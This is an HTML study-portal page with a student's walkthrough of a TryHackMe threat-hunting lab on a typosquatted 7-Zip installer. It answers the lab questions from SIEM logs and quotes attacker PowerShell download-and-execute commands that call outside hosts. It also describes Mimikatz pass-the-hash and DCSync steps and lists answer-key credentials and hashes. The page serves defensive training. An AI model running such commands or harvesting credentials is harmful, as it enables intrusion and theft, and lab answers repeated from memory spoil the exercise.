@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>Hunt Me II Typo Squatters | Blue Team Study Portal</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100 antialiased">
+  <div class="app-shell">
+    <aside class="sidebar">
+    <a class="brand" href="../index.html"><span>BT</span><strong>Blue Team Study Portal</strong></a>
+    <button class="command-button" type="button" id="openCommand">Search / Quick jump <kbd>Ctrl K</kbd></button>
+    <label class="search-box"><span>Search notes</span><input id="globalSearch" type="search" placeholder="Search MITRE, commands, topics"></label>
+    <div id="searchResults" class="search-results" hidden></div>
+    <nav><details class="side-level" open><summary><strong>L1</strong><span>Initial Triage &amp; Fundamentals</span></summary><details class="side-section"><summary>SOC &amp; Incident Response Basics<span>5</span></summary><a class="side-link " href="../pages/soc-essentials.html"><span>SOC Essentials</span><em>0 nodes</em></a><a class="side-link " href="../pages/what-is-incident-response.html"><span>What is Incident Response?</span><em>0 nodes</em></a><a class="side-link " href="../pages/incident-response-cycle.html"><span>Incident Response Cycle</span><em>0 nodes</em></a><a class="side-link " href="../pages/frameworks.html"><span>Frameworks</span><em>5 nodes</em></a><a class="side-link " href="../pages/the-hive.html"><span>The Hive</span><em>0 nodes</em></a></details><details class="side-section"><summary>Operating System &amp; Command Line Basics<span>4</span></summary><a class="side-link " href="../pages/important-windows-directories.html"><span>Important Windows Directories</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-command-line-tools.html"><span>Windows command-line &amp; tools</span><em>0 nodes</em></a><a class="side-link " href="../pages/intro-to-powershell.html"><span>Intro to PowerShell</span><em>0 nodes</em></a><a class="side-link " href="../pages/linux-cheatsheet.html"><span>Linux CheatSheet</span><em>0 nodes</em></a></details><details class="side-section"><summary>Networking &amp; Web Basics<span>3</span></summary><a class="side-link " href="../pages/network.html"><span>Network</span><em>4 nodes</em></a><a class="side-link " href="../pages/network-defenses.html"><span>Network Defenses</span><em>0 nodes</em></a><a class="side-link " href="../pages/web-fundamentals.html"><span>Web Fundamentals</span><em>0 nodes</em></a></details><details class="side-section"><summary>Initial Triage &amp; Analysis<span>3</span></summary><a class="side-link " href="../pages/phishing-analysis.html"><span>Phishing analysis</span><em>14 nodes</em></a><a class="side-link " href="../pages/phishing-analysis-labs.html"><span>Phishing Analysis Labs</span><em>13 nodes</em></a><a class="side-link " href="../pages/osint.html"><span>OSINT</span><em>0 nodes</em></a></details><details class="side-section"><summary>Tool Familiarity<span>3</span></summary><a class="side-link " href="../pages/logging-fundamentals.html"><span>Logging Fundamentals</span><em>0 nodes</em></a><a class="side-link " href="../pages/siem.html"><span>SIEM</span><em>0 nodes</em></a><a class="side-link " href="../pages/elk-elastic-stack.html"><span>ELK (Elastic Stack)</span><em>0 nodes</em></a></details></details><details class="side-level" ><summary><strong>L1.5</strong><span>Advanced Investigation &amp; Contextualization</span></summary><details class="side-section"><summary>Endpoint &amp; OS Investigation<span>5</span></summary><a class="side-link " href="../pages/windows-event-ids.html"><span>Windows Event IDs</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-processes.html"><span>Windows processes</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-security-monitoring.html"><span>Windows Security Monitoring</span><em>4 nodes</em></a><a class="side-link " href="../pages/sysinternals.html"><span>Sysinternals</span><em>0 nodes</em></a><a class="side-link " href="../pages/edr-endpoint-detection-and-response.html"><span>EDR (Endpoint Detection and Response)</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Querying<span>4</span></summary><a class="side-link " href="../pages/splunk.html"><span>Splunk</span><em>0 nodes</em></a><a class="side-link " href="../pages/splunk-filters.html"><span>Splunk Filters</span><em>0 nodes</em></a><a class="side-link " href="../pages/log-analysis-labs.html"><span>Log Analysis Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/regex.html"><span>Regex</span><em>0 nodes</em></a></details><details class="side-section"><summary>Contextualizing Threats<span>3</span></summary><a class="side-link " href="../pages/threat-intelligence.html"><span>Threat Intelligence</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-labs.html"><span>Threat Intelligence Labs</span><em>18 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-toolkit.html"><span>Threat Intelligence Toolkit</span><em>1 nodes</em></a></details><details class="side-section"><summary>Network Investigation<span>1</span></summary><a class="side-link " href="../pages/network-analysis-tools.html"><span>Network Analysis Tools</span><em>3 nodes</em></a></details></details><details class="side-level" ><summary><strong>L2</strong><span>DFIR, Threat Hunting &amp; Engineering</span></summary><details class="side-section"><summary>Proactive Threat Hunting<span>6</span></summary><a class="side-link " href="../pages/hunting-persistence-mitre-ta0003.html"><span>Hunting Persistence (MITRE TA0003)</span><em>11 nodes</em></a><a class="side-link " href="../pages/hunting-lateral-movement-mitre-ta0008.html"><span>Hunting Lateral Movement (MITRE TA0008)</span><em>4 nodes</em></a><a class="side-link " href="../pages/hunting-discovery-mitre-ta0007.html"><span>Hunting Discovery (MITRE TA0007)</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-hunting-module.html"><span>Threat Hunting module</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-hunting-labs-siem.html"><span>Threat hunting Labs (SIEM)</span><em>27 nodes</em></a><a class="side-link " href="../pages/100-splunk-use-cases.html"><span>+100 Splunk Use Cases</span><em>0 nodes</em></a></details><details class="side-section"><summary>Digital Forensics (DFIR)<span>8</span></summary><a class="side-link " href="../pages/digital-forensics.html"><span>Digital Forensics</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-forensics.html"><span>Windows Forensics</span><em>22 nodes</em></a><a class="side-link " href="../pages/forensics-labs.html"><span>Forensics Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/memory-forensics.html"><span>Memory forensics</span><em>0 nodes</em></a><a class="side-link " href="../pages/memory-forensics-labs.html"><span>Memory Forensics Labs</span><em>19 nodes</em></a><a class="side-link " href="../pages/volatility.html"><span>Volatility</span><em>5 nodes</em></a><a class="side-link " href="../pages/linux-artifacts-forensic-evidence-collection.html"><span>Linux Artifacts &amp; Forensic Evidence Collection</span><em>7 nodes</em></a><a class="side-link " href="../pages/stenography.html"><span>Stenography</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Attack Vectors &amp; Internals<span>9</span></summary><a class="side-link " href="../pages/active-directory.html"><span>Active Directory</span><em>7 nodes</em></a><a class="side-link " href="../pages/kerberos-authentication.html"><span>Kerberos authentication</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-ad-attacks.html"><span>Detecting AD Attacks</span><em>15 nodes</em></a><a class="side-link " href="../pages/detecting-active-directory-attacks-htb.html"><span>Detecting Active Directory Attacks / HTB</span><em>6 nodes</em></a><a class="side-link " href="../pages/windows-internals.html"><span>Windows Internals</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control.html"><span>Command-and-Control (C2)</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control-c2-evasion-techniques.html"><span>Command-and-Control (C2) Evasion Techniques</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-web-attacks.html"><span>Detecting Web Attacks</span><em>8 nodes</em></a><a class="side-link " href="../pages/network-analysis-labs.html"><span>Network Analysis Labs</span><em>28 nodes</em></a></details><details class="side-section"><summary>Detection Engineering &amp; Automation<span>6</span></summary><a class="side-link " href="../pages/detection-engineering.html"><span>Detection Engineering</span><em>0 nodes</em></a><a class="side-link " href="../pages/sigma.html"><span>Sigma</span><em>0 nodes</em></a><a class="side-link " href="../pages/yara.html"><span>Yara</span><em>0 nodes</em></a><a class="side-link " href="../pages/atomic-red-team.html"><span>Atomic Red Team</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-modelling.html"><span>Threat Modelling</span><em>5 nodes</em></a><a class="side-link " href="../pages/ad-hardening.html"><span>AD Hardening</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Scripting &amp; Analysis Tooling<span>6</span></summary><a class="side-link " href="../pages/powershell-for-incident-response.html"><span>PowerShell for Incident Response</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-detection.html"><span>Powershell Detection</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-logs.html"><span>PowerShell Logs</span><em>0 nodes</em></a><a class="side-link " href="../pages/lolbins-living-off-the-land-binaries.html"><span>LOLBins (living-off-the-land binaries)</span><em>0 nodes</em></a><a class="side-link " href="../pages/osquery.html"><span>Osquery</span><em>0 nodes</em></a><a class="side-link " href="../pages/cryptography.html"><span>Cryptography</span><em>0 nodes</em></a></details></details></nav>
+  </aside>
+    <main class="content"><header class="topic-hero">
+      <div class="breadcrumbs"><a href="../index.html">Home</a><span>/</span><a href="threat-hunting-module.html">Threat Hunting module</a><span>/</span><span>Hunt Me II Typo Squatters</span></div>
+      <h1>Hunt Me II Typo Squatters</h1>
+      <p>Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessin</p>
+      <div class="tag-row"><span class="tag level">L2</span><span class="tag">SIEM</span><span class="tag">PowerShell</span><span class="tag">Windows</span><span class="tag">Network</span><span class="tag">Kerberos</span><span class="tag">Web</span><span class="tag">Detection</span><span class="tag">Persistence</span><span class="tag">C2</span></div>
+    </header>
+    <div class="reader-layout">
+      <aside class="secondary-nav">
+        <div class="secondary-heading"><span>Current Tree</span><strong>Threat Hunting module</strong></div>
+        <details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-module.html"><span>Threat Hunting module</span><em>L2</em></a>
+      <b>6</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-introduction.html"><span>Threat Hunting Introduction</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-foothold.html"><span>Threat Hunting Foothold</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-pivoting.html"><span>Threat Hunting Pivoting</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-endgame.html"><span>Threat Hunting Endgame</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="hunt-me-i-payment-collectors.html"><span>Hunt Me I Payment Collectors</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="active" href="hunt-me-ii-typo-squatters.html"><span>Hunt Me II Typo Squatters</span><em>L2</em></a>
+      <b>1</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" >
+    <summary>
+      <a class="" href="summary-report-9541433d.html"><span>Summary Report</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details></div>
+  </details></div>
+  </details>
+      </aside>
+      <article class="reader">
+        <section class="content-cards"><h2>Nested Structure</h2><div><a class="content-card" href="summary-report-9541433d.html"><strong>Summary Report</strong><span>1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.</span><em>0 child notes</em></a></div></section>
+        <section class="study-grid">
+    <article><h2>Overview</h2><p>Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessin</p></article>
+    <article><h2>Why It Matters In SOC</h2><p>Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.</p></article>
+    <article><h2>Key Concepts</h2><ul><li>Hunt Me II: Typo Squatters</li><li>Scenario</li><li>1- What is the URL of the malicious software that was downloaded by the victim user?</li><li>http://www.7zipp.org/a/7z2301-x64.msi</li><li>2- What is the IP address of the domain hosting the malware?</li><li>206.189.34.218</li><li>3- What is the PID of the process that executed the malicious software?</li><li>2532</li><li>4- Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?</li><li>powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)</li><li>5- The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?</li><li>C:\Windows\Temp\7zlegit.exe</li></ul></article>
+    <article><h2>Analyst Workflow</h2><ul><li>Identify the user, host, process, network flow, or identity object involved.</li><li>Collect the highest-value logs first and preserve timestamps and assumptions.</li><li>Pivot through related notes, telemetry sources, and MITRE references.</li><li>Document findings, gaps, containment options, and detection improvements.</li></ul></article>
+    <article><h2>Splunk/SIEM Examples</h2><p class="muted">No direct examples extracted.</p></article>
+    <article><h2>Important Commands</h2><div class="code-shell"><div class="code-bar"><span>powershell</span><button class="copy-code" type="button">Copy</button></div><pre><code>Invoke-WebRequest `
+  -Uri &quot;https://www.7-zip.org/a/7z2301-x64.exe&quot; `
+  -OutFile &quot;C:\Windows\Temp\7zlegit.exe&quot;</code></pre></div><div class="code-shell"><div class="code-bar"><span>powershell</span><button class="copy-code" type="button">Copy</button></div><pre><code>-C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\windows\temp\trash.evtx;
+</code></pre></div></article>
+    <article><h2>Tools Used</h2><ul><li>SIEM</li><li>PowerShell</li></ul></article>
+    <article><h2>Notes/Tips</h2><ul><li>Why attackers use services : 1- SYSTEM privileges: services often run as LocalSystem, giving full control. 2- Persistence: service set to Automatic will survive reboots. 3- Stealth: registered services blend into normal OS configuration.</li></ul></article>
+  </section>
+        <section class="source-note"><h2>Original Notes</h2><h2 id="hunt-me-ii-typo-squatters">Hunt Me II: Typo Squatters</h2>
+<p><a class="note-link" href="summary-report-9541433d.html">Summary / Report</a></p>
+<h2 id="scenario">Scenario</h2>
+<p>Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application.</p>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-image-05737d88.png" data-alt="image.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-image-05737d88.png" alt="image.png" loading="lazy"></button></p>
+<p>Last <strong>September 26, 2023</strong>, one of the security analysts observed something unusual on the workstation owned by Perry based on the generated endpoint and network logs. Given this, your SOC lead has assigned you to conduct an in-depth investigation on this workstation and assess the impact of the potential compromise.</p>
+<p><a class="note-link" href="https://tryhackme.com/room/typosquatters">https://tryhackme.com/room/typosquatters</a></p>
+<hr>
+<h4 id="1-what-is-the-url-of-the-malicious-software-that-was-downloaded-by-the-victim-user">1- What is the URL of the malicious software that was downloaded by the victim user?</h4>
+<h4 id="httpwww.7zipp.orga7z2301-x64.msi">http://www.7zipp.org/a/7z2301-x64.msi</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_000029-600c29f8.png" data-alt="Screenshot 2025-04-24 000029.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_000029-600c29f8.png" alt="Screenshot 2025-04-24 000029.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_000150-95925e9c.png" data-alt="Screenshot 2025-04-24 000150.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_000150-95925e9c.png" alt="Screenshot 2025-04-24 000150.png" loading="lazy"></button></p>
+<p>since we know its download and its a zip file and we know the user</p>
+<p><code>process.name: chrome.exe AND 7zipp* user.name:perry.parsons</code></p>
+<h4 id="2-what-is-the-ip-address-of-the-domain-hosting-the-malware">2- What is the IP address of the domain hosting the malware?</h4>
+<h4 id="206.189.34.218">206.189.34.218</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_001647-d829087d.png" data-alt="Screenshot 2025-04-24 001647.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_001647-d829087d.png" alt="Screenshot 2025-04-24 001647.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_000434-cf1144d1.png" data-alt="Screenshot 2025-04-24 000434.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_000434-cf1144d1.png" alt="Screenshot 2025-04-24 000434.png" loading="lazy"></button></p>
+<p>“ dns.resolved_ip.keyword ”</p>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-14_204719-dbf3e1db.png" data-alt="Screenshot 2025-04-14 204719.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-14_204719-dbf3e1db.png" alt="Screenshot 2025-04-14 204719.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-14_214823-4af1b212.png" data-alt="Screenshot 2025-04-14 214823.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-14_214823-4af1b212.png" alt="Screenshot 2025-04-14 214823.png" loading="lazy"></button></p>
+<h4 id="3-what-is-the-pid-of-the-process-that-executed-the-malicious-software">3- What is the PID of the process that executed the malicious software?</h4>
+<h4 id="2532">2532</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_001815-69ba29ca.png" data-alt="Screenshot 2025-04-24 001815.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_001815-69ba29ca.png" alt="Screenshot 2025-04-24 001815.png" loading="lazy"></button></p>
+<p>looking for the files that got downloaded we will found<strong><code>msiexec.exe</code> executing the malicious file</strong></p>
+<p><strong><code>msiexec.exe</code></strong> is the <strong>Windows Installer</strong> executable. It's responsible for installing, modifying, and uninstalling software that uses <code>.msi</code> (Microsoft Installer) or <code>.msp</code> (patch) files.</p>
+<h4 id="4-following-the-execution-chain-of-the-malicious-payload-another-remote-file-was-downloade">4- Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?</h4>
+<h4 id="powershell.exe-iexiwr-httpwww.7zipp.orga7z.ps1-useb">powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_002436-17feea68.png" data-alt="Screenshot 2025-04-24 002436.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_002436-17feea68.png" alt="Screenshot 2025-04-24 002436.png" loading="lazy"></button></p>
+<p>going back to question 1 there are some commands executed after the initial download</p>
+<p>Legitimate <code>msiexec</code> → MSI → PowerShell chain abused to evade detection.</p>
+<ul>
+<li><strong>Parent</strong>: <code>MSI542E.tmp</code> (an unexpected MSI temp)</li>
+<li><strong>Child</strong>: <code>powershell.exe iex(iwr http://7zipp.org/a/7z.ps1 -useb)</code></li>
+<li><strong>Context</strong>: Runs as SYSTEM (full rights)</li>
+<li><strong>Technique</strong>: Fileless download-and-execute (LOL-BAS) via PowerShell</li>
+</ul>
+<h4 id="5-the-newly-downloaded-script-also-installed-the-legitimate-version-of-the-application.-wh">5- The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?</h4>
+<h4 id="cwindowstemp7zlegit.exe">C:\Windows\Temp\7zlegit.exe</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-14_223358-871a05f1.png" data-alt="Screenshot 2025-04-14 223358.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-14_223358-871a05f1.png" alt="Screenshot 2025-04-14 223358.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>powershell</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-powershell">Invoke-WebRequest `
+  -Uri &quot;https://www.7-zip.org/a/7z2301-x64.exe&quot; `
+  -OutFile &quot;C:\Windows\Temp\7zlegit.exe&quot;</code></pre></div>
+<p>so it reaches out to the real 7-Zip website, downloads the official 7-Zip installer (version 23.01 x64) into the Temp folder, and names it <code>7zlegit.exe</code>.</p>
+<h4 id="6-what-is-the-name-of-the-service-that-was-installed">6- What is the name of the service that was installed?</h4>
+<h4 id="7zservice">7zService</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_005350-954579bf.png" data-alt="Screenshot 2025-04-24 005350.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_005350-954579bf.png" alt="Screenshot 2025-04-24 005350.png" loading="lazy"></button></p>
+<p>we already seen it but if we want to search and find it we can search with event code <code>4697</code></p>
+<p>(<strong>provides information about changes to system services</strong>)</p>
+<p>so what happened</p>
+<ul>
+<li>Creates a new service named <strong>7zService</strong> whose executable is the attacker-dropped <code>7zipp.exe</code> (masquerading as 7-Zip).</li>
+<li>Configures it to run automatically under the SYSTEM account.</li>
+<li>Starts it immediately giving the malicious EXE persistent, high-privilege execution.</li>
+</ul>
+<h4 id="7-the-attacker-was-able-to-establish-a-c2-connection-after-starting-the-implanted-service.">7- The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service?</h4>
+<h4 id="system">SYSTEM</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-14_225052-400fa6f5.png" data-alt="Screenshot 2025-04-14 225052.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-14_225052-400fa6f5.png" alt="Screenshot 2025-04-14 225052.png" loading="lazy"></button></p>
+<p>look into the service log</p>
+<blockquote>Why attackers use services : 1- SYSTEM privileges: services often run as LocalSystem, giving full control. 2- Persistence: service set to Automatic will survive reboots. 3- Stealth: registered services blend into normal OS configuration.</blockquote>
+<blockquote></blockquote>
+<h4 id="8-after-dumping-lsass-data-the-attacker-attempted-to-parse-the-data-to-harvest-the-credent">8- After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity?</h4>
+<h4 id="invoke-powerextract">Invoke-PowerExtract</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_005915-f76dd55d.png" data-alt="Screenshot 2025-04-24 005915.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_005915-f76dd55d.png" alt="Screenshot 2025-04-24 005915.png" loading="lazy"></button></p>
+<p>if we look with the attacker ip</p>
+<div class="code-shell"><div class="code-bar"><span>powershell</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-powershell">-C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\windows\temp\trash.evtx;
+</code></pre></div>
+<p>That function parses the dump and extracts credentials (NT-hashes, LSA secrets, Kerberos tickets) purely in PowerShell—no external tools or debuggers needed</p>
+<p>or we can just search with lsass.dmp</p>
+<h4 id="9-what-is-the-credential-pair-that-the-attacker-leveraged-after-the-credential-dumping-act">9- What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash)</h4>
+<h4 id="james.cromwellb852a0b8bd4e00564128e0a5ea2bc4cf">james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_011900-b5e031ad.png" data-alt="Screenshot 2025-04-24 011900.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_011900-b5e031ad.png" alt="Screenshot 2025-04-24 011900.png" loading="lazy"></button></p>
+<p>we use this query to check any credential dumping</p>
+<p><code>winlog.event_id: 1 AND process.command_line: (<em>mimikatz</em> OR <em>DumpCreds</em> OR <em>privilege\:\:debug</em> OR <em>sekurlsa\:\:</em>)</code></p>
+<p>from the output we see</p>
+<p><strong>1- Stage Mimikatz onto the host</strong></p>
+<ul>
+<li>Attacker pulls down the public Mimikatz ZIP from GitHub via <code>Invoke-WebRequest</code> (<code>iwr</code>) into <code>m.zip</code>.</li>
+</ul>
+<p><strong>2- Pass-the-Hash #1 (James Cromwell)</strong></p>
+<ul>
+<li>Executes Mimikatz’s <code>sekurlsa::pth</code> to inject James’s NTLM hash into a new PowerShell—no password needed.</li>
+</ul>
+<p><strong>3- Reload Mimikatz</strong></p>
+<ul>
+<li>Downloads Mimikatz again, ensuring the tool is available in the current working directory.</li>
+</ul>
+<p><strong>4- DCSync (Damian Hall)</strong></p>
+<ul>
+<li>Runs <code>lsadump::dcsync</code> to mimic a Domain Controller and request Damian’s account hashes from AD via the Directory Replication Service API .</li>
+</ul>
+<p><strong>5- Pass-the-Hash #2 (Damian Hall)</strong></p>
+<ul>
+<li>Uses the freshly obtained Damian Hall NTLM hash with <code>sekurlsa::pth</code> to spawn another PowerShell in Damian’s security context .</li>
+</ul>
+<h4 id="10-after-gaining-access-to-the-new-account-the-attacker-attempted-to-reset-the-credentials">10- After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account?</h4>
+<h4 id="pwn3dpw">pwn3dpw!!!</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_021455-9e697f6d.png" data-alt="Screenshot 2025-04-24 021455.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_021455-9e697f6d.png" alt="Screenshot 2025-04-24 021455.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_021341-5a2f81dc.png" data-alt="Screenshot 2025-04-24 021341.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_021341-5a2f81dc.png" alt="Screenshot 2025-04-24 021341.png" loading="lazy"></button></p>
+<p>usually the net.exe command is used for changing password also i already saw  2 compromised users i can search with anna.jones and damian.hall or i can search with event code = 1 all roads lead to rome</p>
+<p>or event code 4724</p>
+<h4 id="11-what-is-the-name-of-the-workstation-where-the-new-account-was-used">11- What is the name of the workstation where the new account was used?</h4>
+<h4 id="wkstn-02">WKSTN-02</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_022208-fd95952b.png" data-alt="Screenshot 2025-04-24 022208.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_022208-fd95952b.png" alt="Screenshot 2025-04-24 022208.png" loading="lazy"></button></p>
+<p>if we follow the logs can see that the attacker switched from WKSTN-03 to WKSTN-02.</p>
+<h4 id="12-after-gaining-access-to-the-new-workstation-a-new-set-of-credentials-was-discovered.-wh">12- After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account?</h4>
+<h4 id="ssfitadminnoo639sk0">SSF\itadmin:NoO6@39Sk0!</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_022449-d135de17.png" data-alt="Screenshot 2025-04-24 022449.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_022449-d135de17.png" alt="Screenshot 2025-04-24 022449.png" loading="lazy"></button></p>
+<p>scrolling down a bit (still using event code 1 with username anna)</p>
+<h4 id="13-aside-from-mimikatz-what-is-the-name-of-the-powershell-script-used-to-dump-the-hash-of-">13- Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin?</h4>
+<h4 id="invoke-sharpkatz.ps1">Invoke-SharpKatz.ps1</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_023216-9b917fd8.png" data-alt="Screenshot 2025-04-24 023216.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_023216-9b917fd8.png" alt="Screenshot 2025-04-24 023216.png" loading="lazy"></button></p>
+<p>just continue digging with anna logs</p>
+<h4 id="14-what-is-the-aes256-hash-of-the-domain-admin-based-on-the-credential-dumping-output">14- What is the AES256 hash of the domain admin based on the credential dumping output?</h4>
+<h4 id="f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534">f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534</h4>
